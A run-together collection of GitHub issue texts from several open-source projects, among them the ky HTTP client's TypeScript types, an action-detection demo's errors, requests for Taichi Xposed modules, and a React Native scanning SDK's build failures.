  kyOptions.json = snakeCase(kyOptions.json); // error: property `json` does not exist on type `OptionsWithoutBody`
  
  try{
    const resp = await ky(input, kyOptions);
    return camelCase(resp.json);
  } catch (e) {
    ...
  }
}
```

However, given the current type of `Options = OptionsWithoutBody | OptionsWithBody` we cannot use `kyOptions.json` as it does not exist in `OptionsWithoutBody`. The compiler only allows access to that property once it knows it's of type `OptionsWithBody`, like so:

```ts
if (kyOptions.method && ['post', 'put', 'patch', 'delete'].includes(kyOptions.method.toLowerCase())) {
  kyOptions.json = snakeCase(kyOptions.json);
}
```

This is not ideal as the application would need to implement the same logic as `ky` to differentiate options with and without body based on the method.

---

On top of that, using an union type makes extending the options awkward. When using interfaces you do:

```ts
interface Options extends KyOptions { 
  snakeCaseTransform: boolean;
}
```

With union types it becomes:

```ts
type Options = KyOptions & {
  snakeCaseTransform: boolean;
}
```

---

As I also mentioned in #162, having this strict type prevents custom or non-whitelisted methods (e.g. `trace`), that are allowed by the spec and `fetch` itself:

```ts
ky('https://example.com', {
  method: 'custom',
});
```

Lastly, it is adding something not enforced by the implementation. The native `fetch` types don't do that discrimination.

---

Thus I want to propose to essentially revert https://github.com/sindresorhus/ky/pull/87 and use `Options` everywhere. This makes the API and types much simpler, easier to read and extend.

Thoughts? Happy to do it if agreed. I don't know if this is intentional, but the README - and the TypeScript definitions - state that in `ky(input, options)` `ky` accepts the same values as `fetch`.

However, passing a Request instance as the value for `input` does not work, since it's stringified [here](https://github.com/sindresorhus/ky/blob/master/index.js#L171) and it turns into `[object Request]`. ```Typescript    
    export default createInstance();
    ^^^^^^
    SyntaxError: Unexpected token export
    > 4 | import ky from "ky";
```

This issue has closed. for me it's bug if i can't easily make 
```Typescript
import ky from "ky";
```

👎  [Storing request specific context in Got](https://github.com/sindresorhus/got/issues/740)

[Pagination support](https://github.com/sindresorhus/got/issues/722)

[Ambiguous URLs](https://github.com/sindresorhus/got/issues/783)

Also, we could possibly add these hooks:

 - [ ] `beforeRedirect`
 - [ ] `beforeRetry`
 - [ ] `beforeError`

Also see https://github.com/sindresorhus/ky/pull/128#issuecomment-485771938 (`mutableDefaults`) I want to edit request url in the beforeRequest hook.
Thx. #### Expected behavior

A Promise rejection.

#### Current behavior

Errors are thrown directly.

#### Code to reproduce

```js
ky('/', {
	prefixUrl: 'https://example.com/'
});
``` I've seen that was added in https://github.com/sindresorhus/ky/pull/87 to fix https://github.com/sindresorhus/ky/issues/85. While it works well on its own (i.e. when invoking `ky` or `ky.get`/`ky.post` shorthands), it complicates the usage of the `Options` type if you ever need to manipulate them.

Take my example, we're wrapping `ky` as we'd like to convert the `body`/`json` keys to snake case before sending to the server and vice-versa on response. Something like:

```ts
import { Input, Options } from 'ky';

export default async function (input: Input, options?: Options) {
  const kyOptions = { ...options };
  kyOptions.json = snakeCase(kyOptions.json); // error: property `json` does not exist on type `OptionsWithoutBody`
  
  try{
    const resp = await ky(input, kyOptions);
    return camelCase(resp.json);
  } catch (e) {
    ...
  }
}
```

However, given the current type of `Options = OptionsWithoutBody | OptionsWithBody` we cannot use `kyOptions.json` as it does not exist in `OptionsWithoutBody`. The compiler only allows access to that property once it knows it's of type `OptionsWithBody`, like so:

```ts
if (kyOptions.method === 'post') {
  kyOptions.json = snakeCase(kyOptions.json);
}
```

This is not ideal as the application would need to implement the same logic as `ky` to differentiate options with and without body based on the method.

---

On top of that, using an union type makes extending the options awkward. When using interfaces you do:

```ts
interface Options extends KyOptions { 
  snakeCaseTransform: boolean;
}
```

With union types it becomes:

```ts
type Options = KyOptions & {
  snakeCaseTransform: boolean;
}
```

---

As I also mentioned in #162, having this strict type prevents custom or non-whitelisted methods (e.g. `trace`), that are allowed by the spec and `fetch` itself:

```ts
ky('https://example.com', {
  method: 'custom',
});
```

Lastly, it is adding something not enforced by the implementation. The native `fetch` types don't do that discrimination.

---

Thus I want to propose to essentially revert https://github.com/sindresorhus/ky/pull/87 and use `Options` everywhere. This makes the API and types much simpler, easier to read and extend.

Thoughts? Happy to do it if agreed. The line under the logo reads "猫の額, 爪の垢を煎じて飲む".

I believe these are 2 Japanese idioms, but these don't make any sense to me as the description of this library. And therefore this line is very misleading for Japanese audience.

(Note: This literally means "The forehead of a cat drinks the dirt under the fingernail (of someone noble)")

How about changing this to "極楽要求(しなさい)" (meaning "make a delightful request")? This is very bad for testing.
when using `ky` tools like pretender can not work, because `ky` stores a reference to `fetch` immediatly after its loaded with `const fetch = getGlobal('fetch');`.

This means when a tool like `pretender` overwrites `window.fetch` for testing `ky` does not use the new `window.fetch` but the stored reference to the *real* fetch and so does a real request.

Is there a good reason to not call `getGlobal('fetch')` whenever `fetch` is required? (currently only [here](https://github.com/sindresorhus/ky/blob/master/index.js#L325) and [here](https://github.com/sindresorhus/ky/blob/master/index.js#L328))

I'm willing to do a PR, but only if it will be merged. Hi,

I was just trying to catch errors in the front-end of my react/redux app when I spotted a really odd behavior.

- When doing a DELETE request on my API without ".json()" appended to my response, http errors are not thrown, even with throwHttpErrors forced true in the options.

```
try {
    await api.delete(`roles/${id}`);
    dispatch(actions.deleteRole(id));
  } catch (error) {
    dispatch({
      type: types.DELETE_ROLE_ERROR,
      payload: {
        error,
      },
    });
  }
```

- When doing the same DELETE request with ".json()" appended to the response, errors are thrown but the request is fired twice so the second one always returns a 404.

```
try {
    await api.delete(`roles/${id}`).json();
    dispatch(actions.deleteRole(id));
  } catch (error) {
    dispatch({
      type: types.DELETE_ROLE_ERROR,
      payload: {
        error,
      },
    });
  }
```

Any idea why this would happen?  Are there any docs? ```js
    try {
      const result = await ky.post('/somepaththaterrors', {
        json: {
          // orsomeparametersthaterrors
        },
      }).json();
    } catch (error) {
      alert(error.message); // Bad Request
    }
```

If on express we do `res.status(400).send('Some error here');`, ky's `error.message` will be "Bad Request" and not "Some error here".

Chrome's Console Network -> XHR requests tab will show that the request returned a response body containing "Some error here" but if we try to traverse the `error` object, there is no path or property that leads us to the returned response body "Some error here"

Is this the intended outcome? I was just thinking that the body of a 4XX response could let us relay additional information on what makes the request a Bad Request. Would be nice to not allow the `body` option when using `ky.get()` and `ky.head()`.

We could use a custom Omit type for this:

```typescript
type Omit<T, K extends keyof T> = Pick<T, Exclude<keyof T, K>>
```

Would also be nice to handle `ky(…, {method: 'get', body: …})`, but not sure whether that is possible?

It would also be nice to disallow the `body` option when the `json` option is used. Are there any docs? Here's a simple repro: https://github.com/exogen/ky-afterResponse-repro

This doesn't seem to happen for every request; I suspect it might have something to do with the response body size. I tried a couple small public JSON API demos before I landed on a GraphQL endpoint that reproduced the behavior.

Under certain conditions, simply including an `afterResponse` hook causes the response Promise to hang. The hook doesn't have to do anything; it can be a no-op function or just return the same cloned response. Removing the hook causes it to start working.

I wonder if the hook causes the response to be cloned and therefore the Promise as well, making one of them never resolve? Just a thought.
<---------->
147393029
When I'm trying to encrypt VM os disk. I'm getting following error:

Error: Code="VMExtensionProvisioningError" Message="VM has reported a failure when processing extension 'test'. Error message: \"LVM OS disk layout does not satisfy prerequisites ( see https://aka.ms/adelvm )\"\r\n\r\nMore information on troubleshooting is available at https://aka.ms/vmextensionlinuxtroubleshoot "

I'm using a custom Redhat image that uses LVM. Is there anyway I can encrypt VM with LVM?

<---------->
147408564
Hello, first of all let me congratulate you on your work, and thank you for sharing it!

Quick question: 
  - I see you limit the number of actors to 14 (in both detect_actions.py and multiprocess_detect_actions.py). Just not to increase memory usage or other specific reason?

Thanks
 why the I3D is cuted on Mixed_4f? Hello, first of all let me congratulate you on your work, and thank you for sharing it!

Quick question: 
  - I see you limit the number of actors to 14 (in both detect_actions.py and multiprocess_detect_actions.py). Just not to increase memory usage or other specific reason?

Thanks
 Thank you very much for sharing your work. This is the first of a kind of action recognition demo I have seen. I am trying to implement your code. I had a few issues while implementing the ` detect_actions.py `.  I will be grateful to you if you could give me some hints as a newbie in this domain. 
`/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/util/tf_inspect.py:75: DeprecationWarning: inspect.getargspec() is deprecated, use inspect.signature() or inspect.getfullargspec()
  return _inspect.getargspec(target)
Loading object detection model at /home/oytun/work/Conditional_Attention_Maps_Demo/object_detection/weights/ssd_mobilenet_v2_coco_2018_03_29/frozen_inference_graph.pb
Traceback (most recent call last):
  File "detect_actions.py", line 312, in <module>
    main()
  File "detect_actions.py", line 52, in main
    obj_detector = obj.Object_Detector(obj_detection_graph)
  File "/home/prashantb/Documents/prashant_workspaace/ACAM_Demo/object_detection/object_detector.py", line 12, in __init__
    serialized_graph = fid.read()
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/lib/io/file_io.py", line 125, in read
    self._preread_check()
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/lib/io/file_io.py", line 85, in _preread_check
    compat.as_bytes(self.__name), 1024 * 512, status)
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/framework/errors_impl.py", line 528, in __exit__
    c_api.TF_GetCode(self.status.status))
tensorflow.python.framework.errors_impl.NotFoundError: /home/oytun/work/Conditional_Attention_Maps_Demo/object_detection/weights/ssd_mobilenet_v2_coco_2018_03_29/frozen_inference_graph.pb; No such file or directory
` Hi.
Thank you for your work, 
I confirmed your demo. Very impressive!
I would like to use your method for training,  may I ask when the training script will be released?

Thanks. @oulutan  I have been trying to run `multiprocess_detect_actions.py`.  I am getting the following output? 
Could you please have a look?  It did not give the  output video. 
````
python multiprocess_detect_actions.py --video_path sample_input.mp4
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/util/tf_inspect.py:75: DeprecationWarning: inspect.getargspec() is deprecated, use inspect.signature() or inspect.getfullargspec()
  return _inspect.getargspec(target)
Reading video file sample_input.mp4
H: 720, W: 1280
Running actions every 8 frame
Writing output to ./output_videos/sample_input_output.mp4
Loading object detection model at ./object_detection/weights/ssd_mobilenet_v2_coco_2018_03_29/frozen_inference_graph.pb
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/numpy/lib/type_check.py:546: DeprecationWarning: np.asscalar(a) is deprecated since NumPy v1.16, use a.item() instead
  'a.item() instead', DeprecationWarning, stacklevel=1)
2019-02-20 17:03:23.811722: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
2019-02-20 17:03:24.746611: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
Using model soft_attn
Loading weights from ./action_detection/weights/model_ckpt_soft_attn_pooled_cosine_drop_ava-130
frame_q: 0, obj_q: 0, act_q: 0, vis_q: 0
Done!
 @oulutan I tried the `detect_actions.py` but it seems something went wrong. 
````
 python detect_actions.py --video_path sample_input.mp4 
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/util/tf_inspect.py:75: DeprecationWarning: inspect.getargspec() is deprecated, use inspect.signature() or inspect.getfullargspec()
  return _inspect.getargspec(target)
Loading object detection model at /home/prashantb/Documents/prashant_workspaace/ACAM_Demo/object_detection/weights/ssd_mobilenet_v2_coco_2018_03_29/frozen_inference_graph.pb
2019-02-20 15:40:08.703071: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
Reading video file sample_input.mp4
Running actions every 8 frame
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/numpy/lib/type_check.py:546: DeprecationWarning: np.asscalar(a) is deprecated since NumPy v1.16, use a.item() instead
  'a.item() instead', DeprecationWarning, stacklevel=1)
Using model soft_attn
Loading weights from ./action_detection/weights/model_ckpt_soft_attn_pooled_cosine_drop_ava-130
frame_cnt: 1
obj det 2.30 seconds
tracker 0.00 seconds
frame_cnt: 2
obj det 0.04 seconds
tracker 0.10 seconds
frame_cnt: 3
obj det 0.04 seconds
tracker 0.02 seconds
frame_cnt: 4
obj det 0.04 seconds
tracker 0.01 seconds
frame_cnt: 5
obj det 0.04 seconds
tracker 0.01 seconds
frame_cnt: 6
obj det 0.04 seconds
tracker 0.01 seconds
frame_cnt: 7
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 8
obj det 0.03 seconds
tracker 0.01 seconds
2019-02-20 15:40:15.682873: W tensorflow/core/framework/allocator.cc:122] Allocation of 353894400 exceeds 10% of system memory.
Person 1
	 stand: 0.201
	 walk: 0.173
	 watch (a person): 0.084
	 carry/hold (an object): 0.051
	 talk to (e.g., self, a person, a group): 0.031
action 2.96 seconds
frame_cnt: 9
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 10
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 11
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 12
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 13
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 14
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 15
obj det 0.04 seconds
tracker 0.01 seconds
frame_cnt: 16
obj det 0.03 seconds
tracker 0.01 seconds
2019-02-20 15:40:18.724569: W tensorflow/core/framework/allocator.cc:122] Allocation of 353894400 exceeds 10% of system memory.
Person 1
	 walk: 0.868
	 watch (a person): 0.176
	 carry/hold (an object): 0.102
	 stand: 0.096
	 talk to (e.g., self, a person, a group): 0.075
action 2.71 seconds
frame_cnt: 17
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 18
obj det 0.04 seconds
tracker 0.01 seconds
frame_cnt: 19
obj det 0.04 seconds
tracker 0.01 seconds
frame_cnt: 20
obj det 0.03 seconds
tracker 0.01 seconds
frame_cnt: 21
obj det 0.03 seconds
tracker 0.01 seconds
Traceback (most recent call last):
  File "detect_actions.py", line 314, in <module>
    main()
  File "detect_actions.py", line 182, in main
    out_img = visualize_detection_results(tracker.frame_history[-16], tracker.active_actors, prob_dict)
  File "detect_actions.py", line 244, in visualize_detection_results
    cv2.rectangle(disp_img, (left,top), (right,bottom), color, 3)
TypeError: only size-1 arrays can be converted to Python scalars
Fatal Python error: could not acquire lock for <_io.BufferedReader name=10> at interpreter shutdown, possibly due to daemon threads

Thread 0x00007fcb45de3700 (most recent call first):
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/imageio_ffmpeg/_parsing.py", line 61 in run
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/threading.py", line 916 in _bootstrap_inner
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/threading.py", line 884 in _bootstrap

Current thread 0x00007fcb86a8e700 (most recent call first):
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/subprocess.py", line 1537 in _communicate
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/subprocess.py", line 843 in communicate
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/imageio_ffmpeg/_io.py", line 189 in read_frames
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/imageio/plugins/ffmpeg.py", line 342 in _close
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/imageio/core/format.py", line 252 in close
  File "/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/imageio/core/format.py", line 241 in __del__
Aborted (core dumped)
``` Thank you for your work, especially for your open code. I really want to use this to my own project, so could you please tell when you will open your training code?   @oulutan  I have been trying to run `multiprocess_detect_actions.py`.  I am getting the following output? 
Could you please have a look?  
````
python multiprocess_detect_actions.py --video_path sample_input.mp4
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/util/tf_inspect.py:75: DeprecationWarning: inspect.getargspec() is deprecated, use inspect.signature() or inspect.getfullargspec()
  return _inspect.getargspec(target)
Reading video file sample_input.mp4
H: 720, W: 1280
Running actions every 8 frame
Writing output to ./output_videos/sample_input_output.mp4
Loading object detection model at ./object_detection/weights/ssd_mobilenet_v2_coco_2018_03_29/frozen_inference_graph.pb
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/numpy/lib/type_check.py:546: DeprecationWarning: np.asscalar(a) is deprecated since NumPy v1.16, use a.item() instead
  'a.item() instead', DeprecationWarning, stacklevel=1)
2019-02-20 17:03:23.811722: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
2019-02-20 17:03:24.746611: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
Using model soft_attn
Loading weights from ./action_detection/weights/model_ckpt_soft_attn_pooled_cosine_drop_ava-130
frame_q: 0, obj_q: 0, act_q: 0, vis_q: 0
Done!
```
` Hello @oulutan ,

thanks very much for this wonderful repo. I have a few confusions regarding the paper and the implementation itself.

1. Although you mentioned in your paper how your work differs from and improves upon the [Actor Conditioned Relation Network (ACRN) paper](https://arxiv.org/pdf/1807.10982.pdf), I am still confused about the main improvements. I would highly appreciate if you could provide some intuitions about how your work improves upon ACRN.

2. It seems that [actor_infos](https://github.com/oulutan/ACAM_Demo/blob/master/object_detection/object_detector.py#L166) keep increasing and never cleared up, whereas, the tracks corresponding to the actors may have been deleted. Shouldn't you delete the actors from actor_infos whose corresponding tracks are deleted?

Thanks. @oulutan Does the IP camera implementation possible with your implementation? If yes, how it would in terms of performance? Thanks Dear
     when will you release the training and evaluation codes? Thank you for your great work. Dear
     when will you release the training and evaluation codes? Thank you for your great work. Thank you for your work, especially for your open code. I really want to use this to my own project, so could you please tell when you will open your training code?   Hi.
Thank you for your work, 
I confirmed your demo. Very impressive!
I would like to use your method for training,  may I ask when the training script will be released?

Thanks. Thanks for sharing your excellent work! I've not run the code but I am wondering whether the person detector you used is finetuned on AVA.  The detectors shown in your paper `F RCNN-NAS` and  `F RCNN-Resnet101` achieve high performance, with AP 97.10 and 95.97 on AVA, respectively. But I use a `FPN-ResNet101` trained on COCO (43 mAP on 80 categories) and it can only achieve nearly 70 AP on AVA. Finetuning models on AVA can improve the performance to ~90. Finetuning detector is a common practice in many papers solving AVA, like SlowFast, Long Term bank. @oulutan I tried the `multiprocess_detect_actions.py` but it seems something went wrong. 
`python multiprocess_detect_actions.py --video_path sample_input.mp4
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/tensorflow/python/util/tf_inspect.py:75: DeprecationWarning: inspect.getargspec() is deprecated, use inspect.signature() or inspect.getfullargspec()
  return _inspect.getargspec(target)
Reading video file sample_input.mp4
H: 720, W: 1280
Running actions every 8 frame
Writing output to ./output_videos/sample_input_output.mp4
Loading object detection model at ./object_detection/weights/ssd_mobilenet_v2_coco_2018_03_29/frozen_inference_graph.pb
/home/prashantb/anaconda3/envs/demo/lib/python3.6/site-packages/numpy/lib/type_check.py:546: DeprecationWarning: np.asscalar(a) is deprecated since NumPy v1.16, use a.item() instead
  'a.item() instead', DeprecationWarning, stacklevel=1)
2019-02-20 15:11:31.092528: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
2019-02-20 15:11:32.130413: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
Using model soft_attn
Loading weights from ./action_detection/weights/model_ckpt_soft_attn_pooled_cosine_drop_ava-130
frame_q: 0, obj_q: 0, act_q: 0, vis_q: 0
Done!
` Hello @oulutan ,

thanks very much for this wonderful repo. I have a few confusions regarding the paper and the implementation itself.

1. Although you mentioned in your paper how your work differs from and improves upon the Action Conditioned Relation Network (ACRN) paper, I am still confused about the main improvements. I would highly appreciate if you could provide some intuitions about how your work improves upon ACRN.

2. It seems that [actor_infos](https://github.com/oulutan/ACAM_Demo/blob/master/object_detection/object_detector.py#L166) keep increasing and never cleared up, whereas, the tracks corresponding to the actors may have been deleted. Shouldn't you delete the actors from actor_infos whose corresponding tracks are deleted?

Thanks. @oulutan Does the IP camera implementation possible with your implementation? If yes, how it would in terms of performance? Thanks why the I3D is cuted on Mixed_4f?
<---------->
148171496
Is there an explanation for what "SpokeStackFrameworkExample" app is supposed to be demonstrating? I see the four options on the initial landing page, and then start/stop recording buttons on each detail page. It asks for microphone access and sometimes speech access, but otherwise nothing seems to happen. There are some debug messages depending on whether I'm running iOS 12 or 13, but it's usually just "didStart" and "didStop".  Is there an explanation for what "SpokeStackFrameworkExample" app is supposed to be demonstrating? I see the four options on the initial landing page, and then start/stop recording buttons on each detail page. It asks for microphone access and sometimes speech access, but otherwise nothing seems to happen. There are some debug messages depending on whether I'm running iOS 12 or 13, but it's usually just "didStart" and "didStop". 
<---------->
148249001
## 模块名字:xp快译

## 模块用途:多种显示模式翻译并可朗读出翻译内容

## 模块版本号:3.0.4+

## 模块安装包:https://www.coolapk.com/apk/com.mhook.MrSFastTranslation Per App Hacking是一款应用优化工具的Xposed模块，这个模块的作用
1 防止应用启动服务
2 禁止或者延迟应用的alarm
3 防止程序唤醒设备
4允许对单个应用设置代理 
5修改应用时间
https://share.weiyun.com/5TK6x7k
请求作者添加这个模块，因为应用控制器3.0不适应太极，所以只能用这个，以上是下载地址，1.5版本，汉化版， 模块名称
app per hacking

模块版本
1.5汉化版

模块用途
Per App Hacking是一款应用优化工具的Xposed模块，这个模块的作用
1 防止应用启动服务
2 禁止或者延迟应用的alarm
3 防止程序唤醒设备
4允许对单个应用设置代理 
5修改应用时间

模块下载地址
https://share.weiyun.com/5TK6x7k
请求作者添加这个模块，因为应用控制器3.0不适应太极，所以只能用这个，以上是下载地址，1.5版本，汉化版， ## 模块名字
per app hacking
## 模块用途
Per App Hacking是一款应用优化工具的 Xposed模块，这个模块的作用:
1防止应用启动服务
2通过提醒来禁止或者延迟应用的自启动
3禁用唤醒锁防止程亨唤醒设备
4允许对单个应用设置代理
5允许对单个应用伪造时间格式: YYYY-MM-DDHH:MI
6限制位图
## 模块版本号
1.5
## 模块安装包
https://www.lanzous.com/i33qbeh 8.1是资瓷的 9.1也资瓷 但是界面会闪退 又要重新加载或者闪退一样再加载 会导致存储重定向模块失效，能不能修复一下。存储重定向作者说这是太极的问题 请求新增模块 SkyOlin Helper（程序窗口化助手）
这是一个很强大的分屏模块   可实现同屏显示多个软件   比手机自带分屏软件更实用

另外不知道  阻止运行 这个模块对太极阴用户是有实际效果  ## 模块名字
Mipushframework(小米系统级推送)
## 模块用途
用于伪装成小米手机，使应用注册小米推送。
## 模块版本号
0.3.6.20190128.b0fe719
## 模块安装包
https://github.com/MiPushFramework/MiPushFramework/releases/download/0.3.6.20190128.b0fe719/xmsf_service.apk
(请务必给出模块的安装包文件，无论是通过网盘还是直接上传；否则此 issue 将被直接忽略！)
 ## Module name
Sudohide
## Usage

对一个应用隐藏另一个应用。使之不被检测到

## Module version 
1.28
## APK file
https://repo.xposed.info/module/com.sudocode.sudohide
Please provide the apk file, otherwise this issue will be ignored!
 麻烦适配一下Google app助手18.1 现在18.0几乎不能使用了 ## 模块名字
应用管理
## 模块用途
限制应用自启、应用权限管理等，目前手机200多个应用全靠这个压着，不然开机后点都点不动
## 模块版本号
5.1.5
## 模块安装包
https://github.com/Tornaco/X-APM/releases/download/5.1.5/x-apm-app-release-aio.apk
(请务必给出模块的安装包文件，无论是通过网盘还是直接上传；否则此 issue 将被直接忽略！)
 在更新完MIUI11以后
不管是重新创建还是优化
QQ8.1.0 8.1.3都会闪退
并且打不开图片
点击消息中的图片时
QQ直接退出报错
麻烦作者尽快修复这个bug ## 什么问题

在该模块的偏好设置内勾选软键盘禁用手势后，调出软键盘时仍然会触发手势（底部，左下和右下），于是只能在不设置这三个区域的手势和打字时触发手势中二选一。
此外，剪贴板功能不正常。具体表现为从快捷面板功能中调出剪贴板后 点击已复制的文字，并不会粘贴到输入框内。
Magisk 版本：18.0
太极 Magisk 模块版本：从一开始的版本就如此
太极APP版本：从一开始的版本就如此
开启的 Xposed 模块：xposed edge pro
Xposed模块版本：5.2.3
开启的其他 Magisk 模块：(无）
其他 Magisk 模块版本：（无）
手机型号：xiaomi mix2s
ROM版本：miui10.3.28

## 配置文件

请提供手机里面的 `/data/system/taichi/modules.list` 以及 `/data/system/taichi/apps.list` 文件。



补充：有能力请务必提供日志文件已快速解决问题。
 刷入magisk模块（zip包）后微信指纹错误，开通指纹支付提示系统错误，可删除系统指纹，重新录入后再试巴拉巴拉的，试过删除系统指纹再录入也是不行，目前在使用另一个指纹模块代替微信指纹支付
手机小米Mix3 开发版 MIUI10  8.11.15 大佬您做的对太极的修改检测让我没有办法进入太极，每次都会提示不要对太极进行修改，但是我想我并没有动过太极。请给我一个解决方法来关闭阴阳之门 vpn软件，多任务后台界面滑掉，或者多任务全部清理，都一直连着，要手动进入软件界面停掉vpn才可以。

## 详细情况
vpn软件，多任务后台界面滑掉，或者多任务全部清理，显示已经杀掉了，🔑图标一直都在，都一直连着，要手动进入软件界面停掉vpn才可以。测试vpn软件为纳豆和brook
所有太极版本都出现这问题。
Magisk 版本：19.3
太极 Magisk 模块版本：v5.1.2
太极APP版本：5.5.2
开启的 Xposed 模块：核心破解，xposed edge
Xposed模块版本：
开启的其他 Magisk 模块：mm管理器
其他 Magisk 模块版本：（无）
手机型号：华为mate9
 `#ROM版本：9.0和9.1

## 配置文件

请提供手机里面的 `/data/system/taichi/modules.list` 以及 `/data/system/taichi/apps.list` 文件。


补充：有能力请务必提供日志文件已快速解决问题。
 酷安反馈转
三星S9+ OneUI 安卓版本9.0
使用Magisk模块版本 - 4.0会无法开机 手机型号：三星S9+
ROM版本：OneUI - 安卓9
是否使用Xposed：否
其他Magisk模块：

问题描述：刷入4.0后无法开机，但是3.8版本可以使用
<---------->
148280525
  ```
[!] No podspec found for `RNGeniusScan` in `../node_modules/@thegrizzlylabs/react-native-genius-scan`
```

Any plan to support Cocoapods linking? (mandatory with RN 0.61+)

Edit: sorry I got it working   Hello,

When we try to build a release version with the SDK we get this error:

> Undefined symbols for architecture armv7:
>   "_OBJC_CLASS_$_GSKScannerUI", referenced from:
>       objc-class-ref in libRNGeniusScan.a(RNGeniusScan.o)
>   "_OBJC_CLASS_$_GSKScannerUIConfiguration", referenced from:
>       objc-class-ref in libRNGeniusScan.a(RNGeniusScan.o)
>   "_OBJC_CLASS_$_GSK", referenced from:
>       objc-class-ref in libRNGeniusScan.a(RNGeniusScan.o)
> ld: symbol(s) not found for architecture armv7

When I build in debug, it works.
We are using @thegrizzlylabs/react-native-genius-scan - 3.0.8 and react-native 0.59.10.
Any ideas?  Hello,

When we try to build a release version with the SDK we get this error:

> Undefined symbols for architecture armv7:
>   "_OBJC_CLASS_$_GSKScannerUI", referenced from:
>       objc-class-ref in libRNGeniusScan.a(RNGeniusScan.o)
>   "_OBJC_CLASS_$_GSKScannerUIConfiguration", referenced from:
>       objc-class-ref in libRNGeniusScan.a(RNGeniusScan.o)
>   "_OBJC_CLASS_$_GSK", referenced from:
>       objc-class-ref in libRNGeniusScan.a(RNGeniusScan.o)
> ld: symbol(s) not found for architecture armv7

When I build in debug, it works.
We are using @thegrizzlylabs/react-native-genius-scan - 3.0.8 and react-native 0.59.10.
Any ideas?  ```
[!] No podspec found for `RNGeniusScan` in `../node_modules/@thegrizzlylabs/react-native-genius-scan`
```

Any plan to support Cocoapods linking? (mandatory with RN 0.61+) Is it possible to disable the auto detection of a document when scanning? > Task :app:processDebugResources FAILED

FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':app:processDebugResources'.
> Android resource linking failed
  /Users/thejasree/.gradle/caches/transforms-2/files-2.1/5dde2ad7b6bc116c332e948e929e7019/res/values-v28/values-v28.xml:9:5-12:13: AAPT: error: resource android:attr/dialogCornerRadius not found.
      
  /Users/thejasree/Desktop/CamScanner/android/app/build/intermediates/incremental/mergeDebugResources/merged.dir/values-v28/values-v28.xml:11: AAPT: error: resource android:attr/dialogCornerRadius not found.
      
  /Users/thejasree/.gradle/caches/transforms-2/files-2.1/d585717eb454004e7c0401e8e435cd11/res/values/values.xml:3:5-58:857: AAPT: error: resource android:attr/fontVariationSettings not found.
      
  /Users/thejasree/.gradle/caches/transforms-2/files-2.1/d585717eb454004e7c0401e8e435cd11/res/values/values.xml:3:5-58:857: AAPT: error: resource android:attr/ttcIndex not found.
      
  error: failed linking references.


React-Native: 0.59.9 Hello :) 

I didn't find any option to change the language of the scanning interface in the SDK API.
Also changing the phone language didn't work :( 

Any suggestions? :)  how to change the cropped image border color blue dotted lines to black?  Just run the demo and get this error, on android works fine.

![IMG_2806](https://user-images.githubusercontent.com/34981526/61644166-7d669680-aca4-11e9-8040-907ee3e23e13.PNG)
 Just run the demo and get this error, on android works fine.

![IMG_2806](https://user-images.githubusercontent.com/34981526/61644166-7d669680-aca4-11e9-8040-907ee3e23e13.PNG)
 > Task :app:processDebugResources FAILED

FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':app:processDebugResources'.
> Android resource linking failed
  /Users/thejasree/.gradle/caches/transforms-2/files-2.1/5dde2ad7b6bc116c332e948e929e7019/res/values-v28/values-v28.xml:9:5-12:13: AAPT: error: resource android:attr/dialogCornerRadius not found.
      
  /Users/thejasree/Desktop/CamScanner/android/app/build/intermediates/incremental/mergeDebugResources/merged.dir/values-v28/values-v28.xml:11: AAPT: error: resource android:attr/dialogCornerRadius not found.
      
  /Users/thejasree/.gradle/caches/transforms-2/files-2.1/d585717eb454004e7c0401e8e435cd11/res/values/values.xml:3:5-58:857: AAPT: error: resource android:attr/fontVariationSettings not found.
      
  /Users/thejasree/.gradle/caches/transforms-2/files-2.1/d585717eb454004e7c0401e8e435cd11/res/values/values.xml:3:5-58:857: AAPT: error: resource android:attr/ttcIndex not found.
      
  error: failed linking references.


